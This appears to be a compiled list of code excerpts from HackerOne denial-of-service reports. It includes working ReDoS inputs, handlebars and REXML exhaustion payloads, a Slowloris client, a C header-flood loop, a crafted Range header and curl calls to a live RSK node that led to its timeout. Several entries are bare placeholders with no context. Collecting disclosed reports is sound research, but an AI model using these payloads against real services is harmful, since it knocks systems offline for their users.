## 66. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```json
{{template:cbdj3_grinch_header.html}}
```

## 67. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```json
{{template:cbdj3_/*grinch*/_header.html}}
```

## 68. [#1066007](https://hackerone.com/reports/1066007)  -  Hacky Holidays CTF Writeup
*critical*

```json
{{template:38dhs_/*admins_only*/_header.html}}
```

## 69. [#357665](https://hackerone.com/reports/357665)  -  DoS in Brave browser for iOS
*low*

```html
<script>
        let o = document.body.appendChild(document.createElement('object'));
        // application/json or application/pdf are valid values too
        o.type = 'text/html' // <-- triggers DoS
    </script>
```

## 70. [#190863](https://hackerone.com/reports/190863)  -  imagefilltoborder stackoverflow on truecolor images
*medium, $500*

```
gdb -q --args /home/operac/php-70-sinasan/sapi/cli/php -n poc.php
Reading symbols from /home/operac/php-70-sinasan/sapi/cli/php...done.
(gdb) b gd.c:1851
Breakpoint 1 at 0x54a354: gd.c:1851. (2 locations)
(gdb) b gd.c:1834
Breakpoint 2 at 0x54a287: gd.c:1834. (2 locations)
(gdb) r
Starting program: /home/operac/php-70-sinasan/sapi/cli/php -n poc.php

Breakpoint 1, php_gd_gdImageFillToBorder (im=0x7ffff2c77000, x=0, y=0, border=1, color=-2) at /home/operac/php-70-sinasan/ext/gd/libgd/gd.c:1851
1851                                            gdImageFillToBorder(im, i, y + 1, border, color);
(gdb) c
Continuing.

Breakpoint 2, php_gd_gdImageFillToBorder (im=0x7ffff2c77000, x=0, y=1, border=1, color=-2) at /home/operac/php-70-sinasan/ext/gd/libgd/gd.c:1834
1834                                            gdImageFillToBorder(im, i, y - 1, border, color);
(gdb) c
Continuing.

Breakpoint 1, php_gd_gdImageFillToBorder (im=0x7ffff2c77000, x=0, y=0, border=1, color=-2) at /home/operac/php-70-sinasan/ext/gd/libgd/gd.c:1851
1851                                            gdImageFillToBorder(im, i, y + 1, border, color);
(gdb) c
Continuing.

Breakpoint 2, php_gd_gdImageFillToBorder (im=0x7ffff2c77000, x=0, y=1, border=1, color=-2) at /home/operac/php-70-sinasan/ext/gd/libgd/gd.c:1834
1834                                            gdImageFillToBorder(im, i, y - 1, border, color);
(gdb) p/x color
$1 = 0xfffffffe
# … truncated …
```

## 71. [#2666849](https://hackerone.com/reports/2666849)  -  Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML
*medium*

```http
puts "Parsing input..."
REXML::Document.new input
```

## 72. [#319629](https://hackerone.com/reports/319629)  -  `rgb2hex` is vulnerable to ReDoS when parsing crafted invalid colors
*medium*

```js
var rgb2hex = require('rgb2hex');
const color = 'rgb(0,0,0,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,0000,';
console.log(rgb2hex(color));
```

## 73. [#1715536](https://hackerone.com/reports/1715536)  -  Deny of service via malicious Content-Type
*high*

```
${address}
```

## 74. [#319593](https://hackerone.com/reports/319593)  -  `sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys
*high*

```
${Array(200000).join(' ')}
```

## 75. [#320586](https://hackerone.com/reports/320586)  -  `foreman` is vulnerable to ReDoS in path
*high*

```
${Array(81000).join('0')}
```

## 76. [#3701692](https://hackerone.com/reports/3701692)  -  Malicious Conflux Endpoint Can Leave Stale Global OOO Queue Accounting After Teardown
*low, $100*

```
PoC: Conflux OOO exact-leg probe queued 124 DATA cells; stop this exit now to force client-side teardown
```

## 77. [#357665](https://hackerone.com/reports/357665)  -  DoS in Brave browser for iOS
*low*

```html
<body>
    <script>
        let o = document.body.appendChild(document.createElement('object'));
        // application/json or application/pdf are valid values too
        o.type = 'text/html' // <-- triggers DoS
    </script>
</body>
```

## 78. [#903521](https://hackerone.com/reports/903521)  -  Fastify uses allErrors: true ajv configuration by default which is susceptible to DoS
*medium, $250*

```
${Math.round(json.length / 1024)}
```

## 79. [#774896](https://hackerone.com/reports/774896)  -  Kubelet resource exhaustion attack via metric label cardinality explosion from unauthenticated requests
*medium*

```
${NODE_IP}
```

## 80. [#774896](https://hackerone.com/reports/774896)  -  Kubelet resource exhaustion attack via metric label cardinality explosion from unauthenticated requests
*medium*

```
${NODE_NAME}
```

## 81. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{#with 'a' as |s0|}}
```

## 82. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{#with (s0.repeat 500000000) as |s|}}
```

## 83. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{s.concat s}}
```

## 84. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{/with}}
```

## 85. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{#with s.split as |a|}}
```

## 86. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{a.push s}}
```

## 87. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```json
{{a.join}}
```

## 88. [#2319584](https://hackerone.com/reports/2319584)  -  "Assertion failed" in node::http2::Http2Session::~Http2Session() leads to HTTP/2 server crash
*high*

```
#  node[3253]: virtual node::http2::Http2Session::~Http2Session() at ../src/node_http2.cc:534
  #  Assertion failed: (current_nghttp2_memory_) == (0)

----- Native stack trace -----

 1: 0xca5430 node::Abort() [node]
 2: 0xca54b0 node::errors::SetPrepareStackTraceCallback(v8::FunctionCallbackInfo<v8::Value> const&) [node]
 3: 0xce7156 node::http2::Http2Session::~Http2Session() [node]
 4: 0xce7192 node::http2::Http2Session::~Http2Session() [node]
 5: 0x106f01d v8::internal::GlobalHandles::InvokeFirstPassWeakCallbacks() [node]
 6: 0x10f3215 v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GarbageCollectionReason, char const*) [node]
 7: 0x10f3d7c v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollectionReason, v8::GCCallbackFlags) [node]
 8: 0x10ca081 v8::internal::HeapAllocator::AllocateRawWithLightRetrySlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]
 9: 0x10cb215 v8::internal::HeapAllocator::AllocateRawWithRetryOrFailSlowPath(int, v8::internal::AllocationType, v8::internal::AllocationOrigin, v8::internal::AllocationAlignment) [node]
10: 0x10a8866 v8::internal::Factory::NewFillerObject(int, v8::internal::AllocationAlignment, v8::internal::AllocationType, v8::internal::AllocationOrigin) [node]
11: 0x15035f6 v8::internal::Runtime_AllocateInYoungGeneration(int, unsigned long*, v8::internal::Isolate*) [node]
12: 0x7f41df699ef6 
Aborted (core dumped)
# … truncated …
```

## 89. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```
❯ ruby -v
ruby 3.2.2 (2023-03-30 revision e51014f9c0) [arm64-darwin22]

❯ rails new range_dos -G -M -C -A -J -T 
=>  Rails 7.1.2, Rack 3.0.8

❯ cd range_dos

❯ bin/rails active_storage:install

❯ bin/rails generate model User avatar:attachment 

❯ bin/rails db:migrate
```

## 90. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```html
<%= form_with model: @user, local: true, :url => {:action => :create}  do |form| %>
  <%= form.file_field :avatar %><br>
  <%= form.submit %>
<% end %>
```

## 91. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```html
<% if @user.avatar.attached? %>
  <%= image_tag rails_storage_proxy_path(@user.avatar) %>
<% end %>
```

## 92. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```
❯ ruby range_request.rb
7446
Partial Content
410058706
```

## 93. [#1489141](https://hackerone.com/reports/1489141)  -  ReDoS in Rack::Multipart
*high*

```
❯ bundle exec ruby rfc2183_benchmark.rb
       user     system      total        real
   0.000018   0.000004   0.000022 (  0.000016)
   0.000357   0.000000   0.000357 (  0.000361)
   0.010888   0.000018   0.010906 (  0.010961)
   0.342814   0.000717   0.343531 (  0.344750)
  10.925193   0.022059  10.947252 ( 10.979092)
  21.906178   0.049380  21.955558 ( 22.024203)
```

## 94. [#1715536](https://hackerone.com/reports/1715536)  -  Deny of service via malicious Content-Type
*high*

```javascript
ContentTypeParser.prototype.getParser = function (contentType) {
  if (contentType in this.customParsers) {
    return this.customParsers[contentType]
  }

...
```

## 95. [#1715536](https://hackerone.com/reports/1715536)  -  Deny of service via malicious Content-Type
*high*

```
> curl -X POST http://127.0.0.1:3000 -H 'Content-Type: constructor'
curl: (52) Empty reply from server
```

## 96. [#319593](https://hackerone.com/reports/319593)  -  `sshpk` is vulnerable to ReDoS when parsing crafted invalid public keys
*high*

```js
var keyPub = `ssh-rsa a${Array(200000).join(' ')}x\nx`;
var key = require('sshpk').parseKey(keyPub, 'ssh');
```

## 97. [#557154](https://hackerone.com/reports/557154)  -  DoS attack via comment on Issue
*low, $1,000*

```
${ProjectURL}
```

## 98. [#557154](https://hackerone.com/reports/557154)  -  DoS attack via comment on Issue
*low, $1,000*

```
${targetID}
```

## 99. [#557154](https://hackerone.com/reports/557154)  -  DoS attack via comment on Issue
*low, $1,000*

```
${gitlabHost}
```

## 100. [#557154](https://hackerone.com/reports/557154)  -  DoS attack via comment on Issue
*low, $1,000*

```
${payload}
```

## 101. [#799072](https://hackerone.com/reports/799072)  -  Slowloris, body parsing
*low, $250*

```
const bodyParser = require('body-parser');
const express = require('express');
const net = require('net');
const http = require('http');

async function run() {
    const expressApp = express();

    expressApp.use(bodyParser.json());

    expressApp.use(async (req, res) => {
        res.send({body: req.body});
    });

    const server = http.createServer(expressApp);

    setInterval(() => {
        console.log(server.connections);
    },  1000);

    server.keepAliveTimeout = 2000;
    server.timeout = 2000;

    await new Promise(resolve => {
        server.listen(3000, '127.0.0.1', () => {
            resolve();
        });
    });

    const client = new net.Socket();

    const length = 5000;

    const msg = `GET / HTTP/1.1
Host: localhost:3000
Accept: */*
Content-Type: application/json
Content-Length: ${length}

["`;
# … truncated …
```

## 102. [#799072](https://hackerone.com/reports/799072)  -  Slowloris, body parsing
*low, $250*

```
${length}
```

## 103. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
${CURL_BIN:-}
```

## 104. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
${WAIT_SECS:-30}
```

## 105. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
${MAX_TIME:-2}
```

## 106. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
${CONNECT_TIMEOUT:-2}
```

## 107. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
${ZERO_FLOOD_HELPERS:-64}
```

## 108. [#3783438](https://hackerone.com/reports/3783438)  -  CVE-2026-11352: QUIC zero-length UDP datagrams busy-loop
*low*

```
${WAIT_SECS}
```

## 109. [#1784449](https://hackerone.com/reports/1784449)  -  Regular Expression Denial of Service in Headers
*low*

```
${performance.now() - start}
```

## 110. [#1784449](https://hackerone.com/reports/1784449)  -  Regular Expression Denial of Service in Headers
*low*

```
${attack.length}
```

## 111. [#880187](https://hackerone.com/reports/880187)  -  Near to Infinite loop when changing Group's name that has API token as Team Member
*medium, $2,500*

```javascript
{
                key: "new",
                value: function(e) {
                    var t = this;
                    this.loadResources(e).always((function() {
                        t.fetched = !0,
                        t.teamMemberGroup = new fO,
                        t.availablePermissions = t.currentTeam.get("available_permissions"),
                        t.trigger("change")
                    }
                    ))
                }
```

## 112. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```
...
██████████32 - - [10/Mar/2019:19:37:36 +0100] "GET /slow.php HTTP/1.1" 500 301 707302 707136 1549.636 "-" "Camo Asset Proxy 2.5.0" "-"
██████████32 - - [10/Mar/2019:19:38:22 +0100] "GET /slow.php HTTP/1.1" 500 301 727742 727576 1594.828 "-" "Camo Asset Proxy 2.5.0" "-"
████32 - - [10/Mar/2019:19:38:22 +0100] "GET /slow.php HTTP/1.1" 500 301 727742 727576 1594.405 "-" "Camo Asset Proxy 2.5.0" "-"
█████████32 - - [10/Mar/2019:19:41:48 +0100] "GET /slow.php HTTP/1.1" 500 301 819366 819200 1800.059 "-" "Camo Asset Proxy 2.5.0" "-
```

## 113. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```
████34 - - [10/Mar/2019:19:38:15 +0100] "GET /big.php HTTP/1.1" 500 300 1073742118 1073741949 49.271 "-" "Camo Asset Proxy 2.5.0" "-"
█████40 - - [10/Mar/2019:19:38:23 +0100] "GET /big.php HTTP/1.1" 500 300 1073742145 1073741976 55.455 "-" "Camo Asset Proxy 2.5.0" "-"
█████34 - - [10/Mar/2019:19:38:36 +0100] "GET /big.php HTTP/1.1" 500 300 1073742126 1073741957 68.682 "-" "Camo Asset Proxy 2.5.0" "-"
```

## 114. [#2072338](https://hackerone.com/reports/2072338)  -  CVE-2023-38039: HTTP header allocation DOS
*medium*

```
void send_payload(int fd)
{
	memset(speedup, 'a', sizeof(speedup));
	//first we send the start of a valid HTTP request with status line and a few headers
    send(fd, validreq, sizeof(validreq), MSG_MORE);	
	while (1337)
	{
		//this is used to speed up the dos process sending extra bytes
		send(fd, speedup, sizeof(speedup), MSG_MORE );
		//now we're spamming the curl client with the header "a:b" then telling it there's more to come !
		send(fd, "a:b\x0d\x0a", 5, MSG_MORE );
	}
}
```

## 115. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```
const handlebars = require('handlebars');

let source = `
{{#with 'a' as |s0|}}
  {{#with (s0.repeat 500000000) as |s|}}
    {{s.concat s}}
    {{s.concat s}}
  {{/with}}
{{/with}}
`;

let template = handlebars.compile(source);
template();
```

## 116. [#726364](https://hackerone.com/reports/726364)  -  Crash Node.js process from handlebars using a small and simple source
*medium*

```
const handlebars = require('handlebars');

let sourceHeader = `
{{#with 'ssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss' as |s|}}
  {{#with s.split as |a|}}
`;
let sourceFooter = `
  {{/with}}
{{/with}}
`;
let sourceBody = '{{a.push s}}{{a.join}}'.repeat(10 ** 3 * 4);
let payload = sourceHeader + sourceBody + sourceFooter;

let template = handlebars.compile(payload);
template();
```

## 117. [#2412583](https://hackerone.com/reports/2412583)  -  Crafted smart contract can take 8 minutes to execute due to bug in modexp precompile.
*high*

```sh
#!/bin/bash

wget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz
tar zxf openjdk-11.0.2_linux-x64_bin.tar.gz
export JAVA_HOME=$(realpath jdk-11.0.2/)
git clone --depth 1 https://github.com/rsksmart/rskj.git
cd rskj/
./configure.sh
echo """
package co.rsk.vm;

import org.ethereum.config.blockchain.upgrades.ActivationConfig;
import co.rsk.config.TestSystemProperties;
import co.rsk.config.VmConfig;
import org.ethereum.vm.*;
import org.ethereum.core.BlockFactory;
import org.ethereum.core.BlockTxSignatureCache;
import org.ethereum.core.ReceivedTxSignatureCache;
import org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;
import java.util.HashSet;
import org.ethereum.vm.program.Program;
import org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;
import javax.xml.bind.DatatypeConverter;
import org.junit.jupiter.api.Test;

public class Poc {
    @Test
    void testPoc() {
        TestSystemProperties config = new TestSystemProperties();
        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));
        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());
        VmConfig vmConfig = config.getVmConfig();
        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();
        ActivationConfig.ForBlock activations = ActivationConfigsForTest.fingerroot500().forBlock(0);

# … truncated …
```

## 118. [#290955](https://hackerone.com/reports/290955)  -  Chrome Extension is vulnerable to the self-DOS issues in case it process the security.txt with a big size
*low*

```
xhr.timeout = 15000; //some value in milliseconds
xhr.ontimeout = function (e) {
//handling timeout
};
```

## 119. [#2389431](https://hackerone.com/reports/2389431)  -  Action Text ReDoS (Ruby 3.1  or lower)
*low*

```log
# ruby 3.1.4
❯ ruby plain_text_regexp_benchmark.rb
       user     system      total        real
   0.000008   0.000001   0.000009 (  0.000007)
   0.000055   0.000001   0.000056 (  0.000055)
   0.004528   0.000003   0.004531 (  0.004534)
   0.385151   0.000659   0.385810 (  0.386042)
  39.185124   0.129945  39.315069 ( 39.408578)

# ruby 3.2.3
❯ ruby plain_text_regexp_benchmark.rb
       user     system      total        real
   0.000008   0.000001   0.000009 (  0.000007)
   0.000010   0.000001   0.000011 (  0.000012)
   0.000060   0.000022   0.000082 (  0.000098)
   0.000549   0.000064   0.000613 (  0.000613)
   0.005388   0.001199   0.006587 (  0.006598)

# ruby 3.3.0
❯ ruby plain_text_regexp_benchmark.rb
       user     system      total        real
   0.000011   0.000001   0.000012 (  0.000008)
   0.000073   0.000001   0.000074 (  0.000073)
   0.000110   0.000011   0.000121 (  0.000122)
   0.001089   0.000196   0.001285 (  0.001285)
   0.010387   0.001831   0.012218 (  0.012250)
```

## 120. [#2389431](https://hackerone.com/reports/2389431)  -  Action Text ReDoS (Ruby 3.1  or lower)
*low*

```log
# ruby 3.1.4
❯ bundle exec rails runner plain_text_benchmark.rb
       user     system      total        real
   0.031610   0.010543   0.042153 (  0.046888)
   0.003494   0.000228   0.003722 (  0.003872)
   0.007226   0.000156   0.007382 (  0.007383)
   0.396392   0.001231   0.397623 (  0.398462)
  39.107745   0.110123  39.217868 ( 39.334358)
```

## 121. [#702987](https://hackerone.com/reports/702987)  -  No redirect_uri in the db for web-internal clientKey leads to one-click DoS on gitter.im
*low*

```
oauthService.findClientByClientKey(clientKey, function(err, client) {
      if (err) {
        return done(err);
      }
```

## 122. [#627376](https://hackerone.com/reports/627376)  -  Application level denial of service due to shutting down the server
*low*

```javascript
var pathname = url.parse(req.url, true).pathname;
	while(pathname.indexOf("/../") != -1) {
		pathname = pathname.replace("/../",""); //fix for path traversal bug
	}
```

## 123. [#627376](https://hackerone.com/reports/627376)  -  Application level denial of service due to shutting down the server
*low*

```javascript
abspath = process.cwd() + pathname;
		console.log('REQUEST: ', req.method, pathname);

		if (fs.existsSync(abspath)) {
			console.log("in condition");
			fs.readFile(abspath, function(err, data) {
				console.log("in condition1");
				var ext = pathname.slice(pathname.indexOf("."));
				var mtype = getMimeType(ext);
				res.writeHead(200, {'Content-Type': mtype});
				console.log(abspath, data);
				res.write(data);
				res.end();
			});
		}
```

## 124. [#1569946](https://hackerone.com/reports/1569946)  -  CVE-2022-32205: Set-Cookie denial of service
*low*

```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        for i in range(0,256):
            self.send_header("Set-Cookie", "f{}={}; Domain=hax.invalid".format(i, "A" * 4092))
        self.end_headers()

if __name__ == "__main__":
    webServer = HTTPServer(("127.0.0.1", 9000), MyServer)
    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass
    webServer.server_close()
```

## 125. [#1784449](https://hackerone.com/reports/1784449)  -  Regular Expression Denial of Service in Headers
*low*

```js
const { Headers } = require("undici");

const headers = new Headers();
const attack = "a" + "\t".repeat(50_000) + "\ta";
const start = performance.now();
headers.append("foo", attack);
console.log(`${performance.now() - start}ms`);
```

## 126. [#363636](https://hackerone.com/reports/363636)  -  DoS through PeerExplorer
*high, $4,000*

```
Through the `startChallenge` method N2 will send N1 another ping message, adding a "challenge" to `activeChallenges` with that new ping message's `messageId`. The issue here is that **the entry is only ever removed from `activeChallenges` if N1 replies with a pong that has the same `messageId` as the new ping message** - as seen in `PeerExplorer.handlePong`. Thus, N1 is able to create an arbitrary number of entries in `activeChallenges` by never sending N2 a pong with the challenge ping's `messageId`.

It should be noted that there is a slight limitation as to how this could be exploited by a single host. The relevant code snippets from `PeerExplorer.java` are below:
```

## 127. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```ruby
class UsersController < ApplicationController

  def new
    @user = User.new
  end

  def create
    user = User.create!(user_params)
    redirect_to "/users/#{user.id}"
  end

  def show
    @user = User.find(params[:id])
  end

  private
    def user_params
      params.require(:user).permit(:avatar)
    end
end
```

## 128. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```http
puts length 

req["Range"] = "bytes=" + "-999999999," * length
```

## 129. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```http
puts res.message
```

## 130. [#2307813](https://hackerone.com/reports/2307813)  -  DoS with crafted "Range" header
*high*

```http
puts res.body.bytesize
```

## 131. [#1489141](https://hackerone.com/reports/1489141)  -  ReDoS in Rack::Multipart
*high*

```ruby
require "net/http"
require "uri"

class Net::HTTPGenericRequest

  def encode_multipart_form_data(out, params, opt)
    charset = opt[:charset]
    boundary = opt[:boundary]
    buf = ''
    params.each do |key, value|
      buf << "--#{boundary}\r\n"
      buf << "Content-Disposition:G;\f=\""  + "=;1=\";\fD=\";t*1*" * 27 + '='
      buf << "Content-Type: application/octet-stream\r\n\r\n"

      buf << "content"
      buf << "\r\n"
    end
    buf << "--#{boundary}--\r\n"
    flush_buffer(out, buf, false)
  end
end  

data = [["dummy"]]

url = URI.parse('http://127.0.0.1:9292/')
req = Net::HTTP::Post.new(url.path)
req.set_form(data, "multipart/form-data")

res = Net::HTTP.new(url.host, url.port).start do |http|
  http.request(req)
end
```

## 132. [#296994](https://hackerone.com/reports/296994)  -  Exim handles BDAT data incorrectly and leads to crash/hang
*high*

```
220 devco.re ESMTP Exim 4.90devstart_213-7c6ec81-XX Mon, 27 Nov 2017 16:58:20 +0800
EHLO test
250-devco.re Hello root at test
250-SIZE 52428800
250-8BITMIME
250-PIPELINING
250-AUTH PLAIN LOGIN CRAM-MD5
250-CHUNKING
250-STARTTLS
250-PRDR
250 HELP
MAIL FROM:<meh@some.domain>
250 OK
RCPT TO:<meh@some.domain>
250 Accepted
BDAT 10
.
250- 10 byte chunk, total 0
250 OK id=1eJFGW-000CB0-1R
```

## 133. [#2645836](https://hackerone.com/reports/2645836)  -  [CVE-2024-35176] DoS vulnerability in REXML
*medium, $2,142*

```rb
Hash.from_xml(request.body.read)
```

## 134. [#507525](https://hackerone.com/reports/507525)  -  DoS attacks utilizing camo.stream.highwebmedia.com
*medium, $400*

```bash
$ netstat -nt | grep ESTABLISHED | grep -c ████32
20
```

## 135. [#2666849](https://hackerone.com/reports/2666849)  -  Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML
*medium*

```
start = ""
middle = "<a xml:b=\"\" b=\"\">" + "<D>" * 1
end = ""
print(start)
COUNT = 2000
for _ in range(COUNT):
	print(middle)
print(end)
```

## 136. [#2666849](https://hackerone.com/reports/2666849)  -  Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML
*medium*

```
require 'timeout'
require 'rexml/document'

include REXML

puts "Reading input from stdin..."
input = ARGF.read
puts "Parsing input..."
REXML::Document.new input
puts "Done!"
```

## 137. [#2666849](https://hackerone.com/reports/2666849)  -  Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML
*medium*

```
https://www.ruby-lang.org/en/news/2024/05/16/dos-rexml-cve-2024-35176/
https://www.ruby-lang.org/en/news/2024/07/16/dos-rexml-cve-2024-39908/
https://www.ruby-lang.org/en/news/2024/08/01/dos-rexml-cve-2024-41123/
```

## 138. [#2666849](https://hackerone.com/reports/2666849)  -  Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML
*medium*

```http
puts "Reading input from stdin..."
```

## 139. [#2666849](https://hackerone.com/reports/2666849)  -  Uncontrolled Resource Consumption when parsing maliciously crafted XML with REXML
*medium*

```http
puts "Done!"

'''
```

## 140. [#1680241](https://hackerone.com/reports/1680241)  -  DoS via Automatic Response Message
*medium*

```bash
python2.7 -c "print 'A' * 50000000"
```

## 141. [#495508](https://hackerone.com/reports/495508)  -  Assertion `len == 1' failed, process aborted while streaming ouput from remote server
*medium*

```
putty: unix/gtkwin.c:3801: void do_text_internal(GtkFrontend *, int, int, wchar_t *, int, unsigned long, int, truecolour): Assertion `len == 1' failed.
Aborted (core dumped)
```

## 142. [#495508](https://hackerone.com/reports/495508)  -  Assertion `len == 1' failed, process aborted while streaming ouput from remote server
*medium*

```http
putty: unix/gtkwin.c:3801: void do_text_internal(GtkFrontend *, int, int, wchar_t *, int, unsigned long, int, truecolour): Assertion `len == 1' failed.
```

## 143. [#1300802](https://hackerone.com/reports/1300802)  -  Possible DOS in app with crashing `exceptions_app`
*medium*

```
2021-08-11 13:23:04 -0500 Rack app ("GET ///wp1/wp-includes/wlwmanifest.xml" - (127.0.0.1)): #<fatal: machine stack overflow in critical region>
```

## 144. [#255822](https://hackerone.com/reports/255822)  -  WebDAV Empty Property search leads to full CPU usage
*medium*

```xml
<?xml version="1.0"?>
<a:propfind xmlns:a="DAV:">
<a:prop></a:prop>
</a:propfind>
```

## 145. [#557154](https://hackerone.com/reports/557154)  -  DoS attack via comment on Issue
*low, $1,000*

```bash
$ ./poc.sh [GitLab host] [Project URL] [target ID(※1)] [Repeat count of request]
```

## 146. [#3002543](https://hackerone.com/reports/3002543)  -  CVE-2024-43398: DoS vulnerability in REXML
*low, $505*

```
require 'rexml/document'

include REXML

puts "Reading input from stdin..."
input = ARGF.read
puts "Parsing input..."
REXML::Document.new input
puts "Done!"
```

## 147. [#3002543](https://hackerone.com/reports/3002543)  -  CVE-2024-43398: DoS vulnerability in REXML
*low, $505*

```http
puts "Done!"
```

## 148. [#2818147](https://hackerone.com/reports/2818147)  -  Unsufficent input verification leads to DoS and resource consumption
*low, $300*

```
HTTP/1.1 503 Service Unavailable
Date: Sun, 03 Nov 2024 10:42:19 GMT
Content-Type: text/plain
Content-Length: 95
Connection: keep-alive
CF-Cache-Status: DYNAMIC
Server: cloudflare
CF-RAY: 8dcbc14b9dd3488f-LIS

upstream connect error or disconnect/reset before headers. reset reason: connection termination
```

## 149. [#3168039](https://hackerone.com/reports/3168039)  -  CVE-2025-5399: WebSocket endless loop
*low*

```bash
$ ./client
```

## 150. [#2389431](https://hackerone.com/reports/2389431)  -  Action Text ReDoS (Ruby 3.1  or lower)
*low*

```ruby
require 'benchmark'

def plain(length)
  text =  "\t" * length + "a" + "\t" * length + "a"
  message = Message.create!(content: "<blockquote>#{text}</blockquote>")
  message.content.to_plain_text
end


Benchmark.bm do |x|
  x.report { plain(10) }
  x.report { plain(100) }
  x.report { plain(1000) }
  x.report { plain(10000) }
  x.report { plain(100000) }
end
```

## 151. [#702987](https://hackerone.com/reports/702987)  -  No redirect_uri in the db for web-internal clientKey leads to one-click DoS on gitter.im
*low*

```
/login/oauth/authorize?response_type=code&client_id=web-internal&redirect_uri=http://whatever
```

## 152. [#702987](https://hackerone.com/reports/702987)  -  No redirect_uri in the db for web-internal clientKey leads to one-click DoS on gitter.im
*low*

```
http://localhost:5000/login/oauth/authorize?response_type=code&client_id=web-internal&redirect_uri=http://whatever
```

## 153. [#324021](https://hackerone.com/reports/324021)  -  JSON RPC methods for debugging enabled by default allow DoS
*medium*

```
# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:14:19]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"eth_blockNumber", "params": [], "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"0x437ca"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:29:37]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":666,"result":"0x1"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:35:46]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_snapshot", "params": {}, "id":666}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":666,"result":"0x2"}

# teknogeek at teknogeek-mbp in ~/Documents/BugBounties/HackerOne/RSK/rskj on git:6e45eaf6 ✖︎ [18:35:52]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"evm_reset", "params": {}, "id":666}' https://bounty-node.rsk.co


^C
# teknogeek at teknogeek-mbp in ~ [18:41:34]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
{"jsonrpc":"2.0","id":1337,"result":"RskJ/0.4.0/Linux/Java1.8/BAMBOO-1192882"}

# teknogeek at teknogeek-mbp in ~ [18:41:37]
→ curl -s -X POST -H "Content-Type: application/json" -d '{"jsonrpc":"2.0","method":"web3_clientVersion", "params": {}, "id":1337}' https://bounty-node.rsk.co
<html>
<head><title>504 Gateway Time-out</title></head>
<body bgcolor="white">
<center><h1>504 Gateway Time-out</h1></center>
<hr><center>nginx</center>
</body>
</html>

